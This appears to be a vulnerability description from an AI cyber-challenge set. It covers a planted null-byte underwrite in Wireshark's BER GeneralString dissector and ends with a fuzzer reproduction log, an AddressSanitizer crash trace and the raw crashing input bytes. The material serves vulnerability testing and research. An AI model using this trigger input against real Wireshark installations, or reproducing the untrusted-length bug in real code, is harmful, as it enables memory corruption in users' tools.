# What functions and functionality is relevant?
The vulnerable function in question is `dissect_ber_GeneralString` contained within `epan/dissectors/packet-ber.c`.

# Why is this vulnerable?
This vulnerability arises out of an incorrect attempt to properly null terminate a string. The goal was to end the string with a null byte, but the case where the packet / attacker provides a negative size will cause the copy not to happen, but during the string termination process of this bad string, the user provided size will be used as the offset to write the null byte.

# Is this a replay and/or is inspired by anything?
This is inspired by a series of CTF challenges from the mid-2015 era that demonstrated the power of single null byte underwrites. A single byte write is enough to compromise program security — through re-entrant code reuse techniques, it can be exploited for further memory corruption via state corruption, leading to remote code execution.

# What makes it interesting?
This bug exemplifies many historical wireshark null byte underwrite bugs. These were typically treated as low priority under the assumption that a single null byte underwrite could not lead to full exploitation — they were categorized as denial of service issues. This challenge demonstrates that such assumptions underestimate the real risk.

# Additional Information

Trusting user supplied string lengths leads to a backwards relative null byte write.

```
shaex@FC-7132:~/oss-fuzz-aixcc$ ~/wireshark/trigger.py;python3 infra/helper.py reproduce -e FUZZSHARK_TARGET=ber wireshark fuzzshark ~/wireshark/.aix
cc/vulns/vuln_003/blobs/blob
INFO:__main__:Running: docker run --privileged --shm-size=2g --platform linux/amd64 --rm -i -e HELPER=True -e ARCHITECTURE=x86_64 -e FUZZSHARK_TARGET=ber -v /home/shaex/oss-fuzz-aixcc/build/out/wireshark:/out -v /home/shaex/wireshark/.aixcc/vulns/vuln_003/blobs/blob:/testcase -t ghcr.io/aixcc-finals/base-runner:v1.0.0 reproduce fuzzshark -runs=100.
+ FUZZER=fuzzshark
+ shift
+ '[' '!' -v TESTCASE ']'
+ TESTCASE=/testcase
+ '[' '!' -f /testcase ']'
+ export RUN_FUZZER_MODE=interactive
+ RUN_FUZZER_MODE=interactive
+ export FUZZING_ENGINE=libfuzzer
+ FUZZING_ENGINE=libfuzzer
+ export SKIP_SEED_CORPUS=1
+ SKIP_SEED_CORPUS=1
+ run_fuzzer fuzzshark -runs=100 /testcase
vm.mmap_rnd_bits = 28
/out/fuzzshark -rss_limit_mb=2560 -timeout=25 -runs=100 /testcase -max_len=1024 < /dev/null
oss-fuzzshark: disabling: snort
oss-fuzzshark: requested dissector: ber
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 3171414750
INFO: Loaded 1 modules   (420436 inline 8-bit counters): 420436 [0xabdaf90, 0xac419e4),
INFO: Loaded 1 PC tables (420436 PCs): 420436 [0xac419e8,0xb2abf28),
/out/fuzzshark: Running 1 inputs 100 time(s) each.
Running: /testcase
=================================================================
==18==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffd5a9017df at pc 0x000000ab40bb bp 0x7ffd5a901650 sp 0x7ffd5a901648
WRITE of size 1 at 0x7ffd5a9017df thread T0
SCARINESS: 46 (1-byte-write-stack-buffer-overflow)
    #0 0xab40ba in dissect_ber_GeneralString /src/wireshark/epan/dissectors/packet-ber.c:3194:34
    #1 0xaaaf7b in try_dissect_unknown_ber /src/wireshark/epan/dissectors/packet-ber.c:935:26
    #2 0x73991d in call_dissector_through_handle /src/wireshark/epan/packet.c:887:9
    #3 0x73991d in call_dissector_work /src/wireshark/epan/packet.c:975:9
    #4 0x744574 in call_dissector_only /src/wireshark/epan/packet.c:3621:8
    #5 0x744574 in call_all_postdissectors /src/wireshark/epan/packet.c:4166:3
    #6 0x10906c7 in dissect_frame /src/wireshark/epan/dissectors/packet-frame.c:1438:5
    #7 0x73991d in call_dissector_through_handle /src/wireshark/epan/packet.c:887:9
    #8 0x73991d in call_dissector_work /src/wireshark/epan/packet.c:975:9
    #9 0x735417 in call_dissector_only /src/wireshark/epan/packet.c:3621:8
    #10 0x735417 in call_dissector_with_data /src/wireshark/epan/packet.c:3634:8
    #11 0x735417 in dissect_record /src/wireshark/epan/packet.c:687:3
    #12 0x726cb0 in epan_dissect_run /src/wireshark/epan/epan.c:666:2
    #13 0x5971f8 in LLVMFuzzerTestOneInput /src/wireshark/fuzz/fuzzshark.c:359:2
    #14 0x44bb70 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
    #15 0x436de5 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:327:6
    #16 0x43c87f in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:862:9
    #17 0x467b22 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #18 0x7fcaa0152082 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)
    #19 0x42efcd in _start (/out/fuzzshark+0x42efcd)

DEDUP_TOKEN: dissect_ber_GeneralString--try_dissect_unknown_ber--call_dissector_through_handle
Address 0x7ffd5a9017df is located in stack of thread T0 at offset 159 in frame
    #0 0xaa9fff in try_dissect_unknown_ber /src/wireshark/epan/dissectors/packet-ber.c:814

DEDUP_TOKEN: try_dissect_unknown_ber
  This frame has 12 object(s):
    [32, 40) 'val.i510' (line 2021)
    [64, 72) 'val.i' (line 2021)
    [96, 97) 'ber_class' (line 816)
    [112, 113) 'pc' (line 817)
    [128, 132) 'tag' (line 818)
    [144, 148) 'len' (line 821)
    [160, 240) 'name_string' (line 825) <== Memory access at offset 159 underflows this variable
    [272, 480) 'asn1_ctx' (line 833)
    [544, 568) 'except_sn' (line 892)
    [608, 856) 'except_ch' (line 892)
    [928, 952) 'except_sn149' (line 992)
    [992, 1240) 'except_ch150' (line 992)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow /src/wireshark/epan/dissectors/packet-ber.c:3194:34 in dissect_ber_GeneralString
Shadow bytes around the buggy address:
  0x7ffd5a901500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffd5a901580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffd5a901600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffd5a901680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffd5a901700: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 f8 f2 f2 f2
=>0x7ffd5a901780: f8 f2 f2 f2 01 f2 01 f2 04 f2 04[f2]00 00 00 00
  0x7ffd5a901800: 00 00 00 00 00 00 f2 f2 f2 f2 00 00 00 00 00 00
  0x7ffd5a901880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffd5a901900: 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2 f8 f8 f8 f2
  0x7ffd5a901980: f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8
  0x7ffd5a901a00: f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==18==ABORTING
MS: 0 ; base unit: 0000000000000000000000000000000000000000
0x1b,0x84,0x0,0x0,0x0,0xc5,0x41,0x84,0x0,0x0,0x0,0xc6,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x88,0xff,
\033\204\000\000\000\305A\204\000\000\000\306\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\210\377
subprocess command returned a non-zero exit status: 1
```

